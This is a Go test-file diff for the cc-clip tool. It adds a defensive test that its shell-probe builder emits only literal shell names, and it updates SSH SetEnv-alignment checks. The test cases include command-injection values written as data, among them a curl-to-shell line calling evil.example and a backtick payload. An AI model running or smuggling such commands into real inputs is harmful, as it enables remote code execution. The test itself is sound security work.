@@ -14,6 +14,57 @@ import (
 	"github.com/shunmei/cc-clip/internal/tunnel"
 )
 
+// TestBuildInteractiveShellProbeOnlyEmitsLiteralShellNames pins the
+// security contract for the $SHELL-driven probe: regardless of what the
+// remote $SHELL returns, the produced script must contain only one of
+// the three literal shell names ("bash", "zsh", "fish") at the start of
+// the command — never the raw shellPath. A future refactor that
+// interpolates shellPath would let a crafted remote $SHELL value (e.g.
+// `/bin/bash -c pwned` or a path with shell metacharacters) reach ssh
+// verbatim, which is the exact injection vector the literal-allowlist
+// design exists to prevent.
+func TestBuildInteractiveShellProbeOnlyEmitsLiteralShellNames(t *testing.T) {
+	cases := []struct {
+		name      string
+		shellPath string
+		wantHead  string // expected script prefix
+	}{
+		{name: "empty falls back to bash", shellPath: "", wantHead: "bash -ic"},
+		{name: "ksh falls back to bash", shellPath: "/bin/ksh", wantHead: "bash -ic"},
+		{name: "zsh literal substring matches", shellPath: "/usr/bin/zsh", wantHead: "zsh -ic"},
+		{name: "fish literal substring matches", shellPath: "/opt/homebrew/bin/fish", wantHead: "fish -i -c"},
+		{name: "command-injection attempt is sanitized to bash",
+			shellPath: "/bin/bash -c 'curl evil.example/sh|sh'",
+			// "/bin/bash" matches no zsh/fish substring → falls back to "bash"
+			// and the suspicious -c never reaches argv because we ignore shellPath
+			// from this point on.
+			wantHead: "bash -ic"},
+		{name: "command-injection via backtick stays sanitized",
+			shellPath: "`pwned`",
+			wantHead:  "bash -ic"},
+	}
+	for _, tc := range cases {
+		t.Run(tc.name, func(t *testing.T) {
+			got := buildInteractiveShellProbe(tc.shellPath, "cc-clip")
+			if !strings.HasPrefix(got, tc.wantHead) {
+				t.Fatalf("script %q does not start with %q", got, tc.wantHead)
+			}
+			// Defense in depth: regardless of the input, the raw shellPath
+			// must not appear anywhere in the produced script (it would
+			// only be there if a future refactor interpolated it).
+			if tc.shellPath != "" && strings.Contains(got, tc.shellPath) {
+				// Allow the substring overlap that comes from the shell-
+				// name match (e.g. "zsh" appearing in "/usr/bin/zsh"). The
+				// real risk is the *full path* leaking through, so check
+				// that.
+				if strings.Contains(got, "/") && strings.Contains(got, tc.shellPath) {
+					t.Fatalf("raw shellPath %q leaked into script: %q", tc.shellPath, got)
+				}
+			}
+		})
+	}
+}
+
 func TestRemotePathExprExpandsLegacyHome(t *testing.T) {
 	got := remotePathExpr("~/.cache/cc-clip")
 	if got != `"$HOME/.cache/cc-clip"` {
@@ -445,7 +496,7 @@ func TestCheckSetEnvAlignmentMatches(t *testing.T) {
 		Label:        "imac",
 		ReservedPort: 18340,
 		StateDir:     "/home/shared/.cache/cc-clip/peers/peer-a",
-	})
+	}, nil, nil)
 	if got == nil {
 		t.Fatal("expected non-nil CheckResult on SetEnv match")
 	}
@@ -478,7 +529,7 @@ func TestCheckSetEnvAlignmentFailsOnPortMismatch(t *testing.T) {
 		PeerID:       "peer-a",
 		ReservedPort: 18340,
 		StateDir:     "/home/shared/.cache/cc-clip/peers/peer-a",
-	})
+	}, nil, nil)
 	if got == nil || got.OK {
 		t.Fatalf("expected failing check on port mismatch, got %#v", got)
 	}
@@ -508,7 +559,7 @@ func TestCheckSetEnvAlignmentFailsOnStateDirMismatch(t *testing.T) {
 	got := checkSetEnvAlignment("myserver", &peer.Registration{
 		ReservedPort: 18340,
 		StateDir:     "/home/shared/.cache/cc-clip/peers/peer-a",
-	})
+	}, nil, nil)
 	if got == nil || got.OK {
 		t.Fatalf("expected failing check on state dir mismatch, got %#v", got)
 	}
@@ -521,10 +572,10 @@ func TestCheckSetEnvAlignmentFailsOnStateDirMismatch(t *testing.T) {
 // when there is no peer registration to compare against — otherwise
 // every legacy/pre-peer-registry install would surface a spurious warning.
 func TestCheckSetEnvAlignmentSkipsWithoutPeer(t *testing.T) {
-	if got := checkSetEnvAlignment("myserver", nil); got != nil {
+	if got := checkSetEnvAlignment("myserver", nil, nil, nil); got != nil {
 		t.Fatalf("expected nil without peer, got %#v", got)
 	}
-	if got := checkSetEnvAlignment("myserver", &peer.Registration{}); got != nil {
+	if got := checkSetEnvAlignment("myserver", &peer.Registration{}, nil, nil); got != nil {
 		t.Fatalf("expected nil with empty peer, got %#v", got)
 	}
 }
@@ -547,7 +598,7 @@ func TestCheckSetEnvAlignmentFailsWhenManagedBlockMissing(t *testing.T) {
 	got := checkSetEnvAlignment("myserver", &peer.Registration{
 		ReservedPort: 18340,
 		StateDir:     "/home/shared/.cache/cc-clip/peers/peer-a",
-	})
+	}, nil, nil)
 	if got == nil || got.OK {
 		t.Fatalf("expected failing result when no managed block present, got %#v", got)
 	}
@@ -556,6 +607,28 @@ func TestCheckSetEnvAlignmentFailsWhenManagedBlockMissing(t *testing.T) {
 	}
 	if !strings.Contains(got.Message, "cc-clip connect myserver") {
 		t.Fatalf("expected resync guidance, got %q", got.Message)
+	}
+}
+
+func TestCheckSetEnvAlignmentReportsUnsupportedWildcardLayout(t *testing.T) {
+	old := readLocalSSHConfig
+	t.Cleanup(func() { readLocalSSHConfig = old })
+	readLocalSSHConfig = func() ([]byte, error) {
+		return []byte("Host *.example.com\n  HostName srv\n"), nil
+	}
+
+	got := checkSetEnvAlignment("srv.example.com", &peer.Registration{
+		ReservedPort: 18340,
+		StateDir:     "/home/shared/.cache/cc-clip/peers/peer-a",
+	}, nil, nil)
+	if got == nil || got.OK {
+		t.Fatalf("expected failing result for wildcard-only layout, got %#v", got)
+	}
+	if !strings.Contains(got.Message, "wildcard/negation patterns") {
+		t.Fatalf("expected unsupported-layout explanation, got %q", got.Message)
+	}
+	if strings.Contains(got.Message, "rerun 'cc-clip connect") {
+		t.Fatalf("unexpected impossible remediation in message: %q", got.Message)
 	}
 }
 
@@ -574,7 +647,7 @@ func TestCheckSetEnvAlignmentFailsOnCorruptedManagedBlock(t *testing.T) {
 	got := checkSetEnvAlignment("myserver", &peer.Registration{
 		ReservedPort: 18340,
 		StateDir:     "/home/shared/.cache/cc-clip/peers/peer-a",
-	})
+	}, nil, nil)
 	if got == nil || got.OK {
 		t.Fatalf("expected failing result on corrupted managed block, got %#v", got)
 	}
@@ -624,7 +697,10 @@ func helperExitError(t *testing.T, code int, stderr string) (error, string) {
 
 // TestCheckSetEnvAlignmentSkipsOnUnreadableConfig pins that a missing
 // ~/.ssh/config (which is the default for users who never created one)
-// does not fail the check — the multi-laptop feature is opt-in.
+// does not fail the check, but DOES surface a passing advisory so the
+// operator can see why the SetEnv-alignment check did not actually run
+// and gets the exact manual line they would need to add. Silently
+// returning nil here would hide the skip in `cc-clip doctor` output.
 func TestCheckSetEnvAlignmentSkipsOnUnreadableConfig(t *testing.T) {
 	old := readLocalSSHConfig
 	t.Cleanup(func() { readLocalSSHConfig = old })
@@ -635,9 +711,27 @@ func TestCheckSetEnvAlignmentSkipsOnUnreadableConfig(t *testing.T) {
 	got := checkSetEnvAlignment("myserver", &peer.Registration{
 		ReservedPort: 18340,
 		StateDir:     "/tmp/peer-a",
+	}, nil, nil)
+	if got == nil {
+		t.Fatal("expected advisory CheckResult on unreadable config, got nil")
+	}
+	if !got.OK {
+		t.Fatalf("expected OK=true (advisory, not failure), got %#v", got)
+	}
+	if !strings.Contains(got.Message, "skipped") {
+		t.Fatalf("expected message to explain skip, got %q", got.Message)
+	}
+	if !strings.Contains(got.Message, "SetEnv CC_CLIP_PORT=18340") {
+		t.Fatalf("expected message to include manual SetEnv line, got %q", got.Message)
+	}
+}
+
+func TestResolveDoctorStateDirPrefersManagedSetEnvWhenPeerLookupMisses(t *testing.T) {
+	got := resolveDoctorStateDir(nil, map[string]string{
+		"CC_CLIP_STATE_DIR": "/home/shared/.cache/cc-clip/peers/peer-a",
 	})
-	if got != nil {
-		t.Fatalf("expected nil on unreadable config, got %#v", got)
+	if got != "/home/shared/.cache/cc-clip/peers/peer-a" {
+		t.Fatalf("state dir = %q, want managed SetEnv state dir", got)
 	}
 }
 
